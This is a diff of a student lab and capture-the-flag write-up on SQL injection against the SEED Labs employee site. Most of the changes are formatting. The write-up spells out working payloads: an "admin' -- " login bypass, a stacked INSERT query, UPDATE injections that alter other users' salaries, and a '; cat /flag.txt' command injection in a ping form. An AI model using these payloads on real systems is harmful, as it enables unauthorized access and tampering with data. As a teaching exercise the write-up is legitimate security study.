@@ -17,11 +17,10 @@ mysql> show tables;
 Now we have access to the database and can run queries in it. From what is asked:
 
 > After running the commands above, you need to use a SQL command to print all the profile information of the employee Alice.
-> 
 
 The query we need to run is `SELECT * FROM credential WHERE Name="Alice";` and we get the following results:
 
-![Query Results 1](./images/query_results.png)
+![Query Results 1](../images/query_results.png)
 
 ### Task 2.1
 
@@ -61,7 +60,7 @@ From the two code excerpts above we can find 2 vulnerabilities:
 
 Seeing as there is no validation of the input, we can insert anything!
 
-To login as an admin, we can input the following in the `username` field: "admin' -- " without the quotes, and anything into the password. 
+To login as an admin, we can input the following in the `username` field: "admin' -- " without the quotes, and anything into the password.
 
 By doing this, we are sending the username as `admin` but commenting the `password` part using `-- '` (after the SQL comment there must be a space). this string will be replaced in the original query, so the query becomes:
 
@@ -76,7 +75,7 @@ And we can access the admin profile.
 
 ### Task 2.2
 
-For this task, we need to do the same as in Task 2.1, but without using a webpage. So the solution is to use `curl` and do a request to the login webpage, passing as parameters the contents of the form fields. 
+For this task, we need to do the same as in Task 2.1, but without using a webpage. So the solution is to use `curl` and do a request to the login webpage, passing as parameters the contents of the form fields.
 
 A possible problem would be that we would need to surround the URL with single quotes, making it necessary to encode the single codes inside the URL. But since curl interprets the first argument as the URL without codes, we didn't face this problem, and the task was easy to conclude. By running the following command:
 
@@ -108,37 +107,132 @@ all. Therefore the navbar tag starts before the php tag but it end within the ph
 
 <!DOCTYPE html>
 <html lang="en">
-<head>
-  <!-- Required meta tags -->
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
 
-  <!-- Bootstrap CSS -->
-  <link rel="stylesheet" href="css/bootstrap.min.css">
-  <link href="css/style_home.css" type="text/css" rel="stylesheet">
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="css/bootstrap.min.css" />
+    <link href="css/style_home.css" type="text/css" rel="stylesheet" />
 
-  <!-- Browser Tab title -->
-  <title>SQLi Lab</title>
-</head>
-<body>
-  <nav class="navbar fixed-top navbar-expand-lg navbar-light" style="background-color: #3EA055;">
-    <div class="collapse navbar-collapse" id="navbarTogglerDemo01">
-      <a class="navbar-brand" href="unsafe_home.php" ><img src="seed_logo.png" style="height: 40px; width: 200px;" alt="SEEDLabs"></a>
+    <!-- Browser Tab title -->
+    <title>SQLi Lab</title>
+  </head>
+  <body>
+    <nav class="navbar fixed-top navbar-expand-lg navbar-light" style="background-color: #3EA055;">
+      <div class="collapse navbar-collapse" id="navbarTogglerDemo01">
+        <a class="navbar-brand" href="unsafe_home.php"><img src="seed_logo.png" style="height: 40px; width: 200px;" alt="SEEDLabs" /></a>
 
-      <ul class='navbar-nav mr-auto mt-2 mt-lg-0' style='padding-left: 30px;'><li class='nav-item active'><a class='nav-link' href='unsafe_home.php'>Home <span class='sr-only'>(current)</span></a></li><li class='nav-item'><a class='nav-link' href='unsafe_edit_frontend.php'>Edit Profile</a></li></ul><button onclick='logout()' type='button' id='logoffBtn' class='nav-link my-2 my-lg-0'>Logout</button></div></nav><div class='container'><br><h1 class='text-center'><b> User Details </b></h1><hr><br><table class='table table-striped table-bordered'><thead class='thead-dark'><tr><th scope='col'>Username</th><th scope='col'>EId</th><th scope='col'>Salary</th><th scope='col'>Birthday</th><th scope='col'>SSN</th><th scope='col'>Nickname</th><th scope='col'>Email</th><th scope='col'>Address</th><th scope='col'>Ph. Number</th></tr></thead><tbody><tr><th scope='row'> Alice</th><td>10000</td><td>20000</td><td>9/20</td><td>10211002</td><td></td><td></td><td></td><td></td></tr><tr><th scope='row'> Boby</th><td>20000</td><td>30000</td><td>4/20</td><td>10213352</td><td></td><td></td><td></td><td></td></tr><tr><th scope='row'> Ryan</th><td>30000</td><td>50000</td><td>4/10</td><td>98993524</td><td></td><td></td><td></td><td></td></tr><tr><th scope='row'> Samy</th><td>40000</td><td>90000</td><td>1/11</td><td>32193525</td><td></td><td></td><td></td><td></td></tr><tr><th scope='row'> Ted</th><td>50000</td><td>110000</td><td>11/3</td><td>32111111</td><td></td><td></td><td></td><td></td></tr><tr><th scope='row'> Admin</th><td>99999</td><td>400000</td><td>3/5</td><td>43254314</td><td></td><td></td><td></td><td></td></tr></tbody></table>      <br><br>
+        <ul class="navbar-nav mr-auto mt-2 mt-lg-0" style="padding-left: 30px;">
+          <li class="nav-item active">
+            <a class="nav-link" href="unsafe_home.php">Home <span class="sr-only">(current)</span></a>
+          </li>
+          <li class="nav-item"><a class="nav-link" href="unsafe_edit_frontend.php">Edit Profile</a></li>
+        </ul>
+        <button onclick="logout()" type="button" id="logoffBtn" class="nav-link my-2 my-lg-0">Logout</button>
+      </div>
+    </nav>
+    <div class="container">
+      <br />
+      <h1 class="text-center"><b> User Details </b></h1>
+      <hr />
+      <br />
+      <table class="table table-striped table-bordered">
+        <thead class="thead-dark">
+          <tr>
+            <th scope="col">Username</th>
+            <th scope="col">EId</th>
+            <th scope="col">Salary</th>
+            <th scope="col">Birthday</th>
+            <th scope="col">SSN</th>
+            <th scope="col">Nickname</th>
+            <th scope="col">Email</th>
+            <th scope="col">Address</th>
+            <th scope="col">Ph. Number</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <th scope="row">Alice</th>
+            <td>10000</td>
+            <td>20000</td>
+            <td>9/20</td>
+            <td>10211002</td>
+            <td></td>
+            <td></td>
+            <td></td>
+            <td></td>
+          </tr>
+          <tr>
+            <th scope="row">Boby</th>
+            <td>20000</td>
+            <td>30000</td>
+            <td>4/20</td>
+            <td>10213352</td>
+            <td></td>
+            <td></td>
+            <td></td>
+            <td></td>
+          </tr>
+          <tr>
+            <th scope="row">Ryan</th>
+            <td>30000</td>
+            <td>50000</td>
+            <td>4/10</td>
+            <td>98993524</td>
+            <td></td>
+            <td></td>
+            <td></td>
+            <td></td>
+          </tr>
+          <tr>
+            <th scope="row">Samy</th>
+            <td>40000</td>
+            <td>90000</td>
+            <td>1/11</td>
+            <td>32193525</td>
+            <td></td>
+            <td></td>
+            <td></td>
+            <td></td>
+          </tr>
+          <tr>
+            <th scope="row">Ted</th>
+            <td>50000</td>
+            <td>110000</td>
+            <td>11/3</td>
+            <td>32111111</td>
+            <td></td>
+            <td></td>
+            <td></td>
+            <td></td>
+          </tr>
+          <tr>
+            <th scope="row">Admin</th>
+            <td>99999</td>
+            <td>400000</td>
+            <td>3/5</td>
+            <td>43254314</td>
+            <td></td>
+            <td></td>
+            <td></td>
+            <td></td>
+          </tr>
+        </tbody>
+      </table>
+      <br /><br />
       <div class="text-center">
-        <p>
-          Copyright &copy; SEED LABs
-        </p>
+        <p>Copyright &copy; SEED LABs</p>
       </div>
     </div>
     <script type="text/javascript">
-    function logout(){
-      location.href = "logoff.php";
-    }
+      function logout() {
+        location.href = 'logoff.php';
+      }
     </script>
   </body>
-  </html>
+</html>
 ```
 
 ### Task 2.3
@@ -146,7 +240,7 @@ all. Therefore the navbar tag starts before the php tag but it end within the ph
 For this task, we need to try to run two SQL statements by exploiting the vulnerabilities in the previous tasks. we can try to login as admin and add another user in the same input by trying the following:
 
 ```php
-admin'; INSERT INTO `credential` VALUES  (7,'Dani','60000',20000,'9/20','10211002','a','a','a','a','7110eda4d09e062aa5e4a390b0a572ac0d2c0220') -- 
+admin'; INSERT INTO `credential` VALUES  (7,'Dani','60000',20000,'9/20','10211002','a','a','a','a','7110eda4d09e062aa5e4a390b0a572ac0d2c0220') --
 // password is 1234 in SHA1
 ```
 
@@ -196,7 +290,7 @@ In order to exploit this vulnerability, we started by forcing into Alice's accou
 
 Next, on Alice's edit profile page, we insert in the address field the input "galho', salary=1 where name='Alice'; --", which changes the value of the address field and also adds the possibility of changing the value of the salary field to 1. It was also necessary to indicate the user who wanted to change his own salary, since that part on the SQL code would also be commented, by indicating in the column `name` the name of the target user.
 
-As the final result, the inserted input will be replaced in the query as followed: 
+As the final result, the inserted input will be replaced in the query as followed:
 
 ```sql
 UPDATE credential SET nickname='$input_nickname',email='$input_email',address='galho', salary=1 -- ',Password='$hashed_pwd',PhoneNumber='$input_phonenumber' where ID=$id;
@@ -204,7 +298,7 @@ UPDATE credential SET nickname='$input_nickname',email='$input_email',address='g
 
 When saving the changes made, we have the following result:
 
-![Query Results 2](./images/query_results_2.png)
+![Query Results 2](../images/query_results_2.png)
 
 ## Task 3.2
 
@@ -218,7 +312,7 @@ UPDATE credential SET nickname='boby', salary=1 where name='Boby'; -- ',email='$
 
 With the previous SQL code, we obtain the following result:
 
-![Query Results 3](./images/query_results_3.png)
+![Query Results 3](../images/query_results_3.png)
 
 ## **CTF write-up/resolution**
 
@@ -228,14 +322,14 @@ When entering the website we are presented with a login page. To unlock the vaul
 
 The goal for this CTF is to log in as an admin. To achieve that, we can use SQL Injection, since the user inputs are not verified, nor used as parameters for the query.
 
- Taking advantage of that attack:
+Taking advantage of that attack:
 
 ```bash
-username: admin' -- 
+username: admin' --
 password: (any character)
 ```
 
-By doing this, we are sending the *username* as admin but commenting the password part using *' --*  (after the SQL comment there must be a space). Even though the password will be commented in the backend, we must still provide at least a character because the frontend form requires it.
+By doing this, we are sending the _username_ as admin but commenting the password part using _' --_ (after the SQL comment there must be a space). Even though the password will be commented in the backend, we must still provide at least a character because the frontend form requires it.
 
 We can successfully login and obtain the flag.
 
@@ -264,7 +358,7 @@ PING RESULTS
 index.php network_report.html ping.php ping.php
 ```
 
-We can see that we can successfully chain commands, and list the current directory. Now we just have to list the contents of */flag.txt* file to get the flag, and we can do that with `; cat /flag.txt`
+We can see that we can successfully chain commands, and list the current directory. Now we just have to list the contents of _/flag.txt_ file to get the flag, and we can do that with `; cat /flag.txt`
 
 ```bash
 PING RESULTS
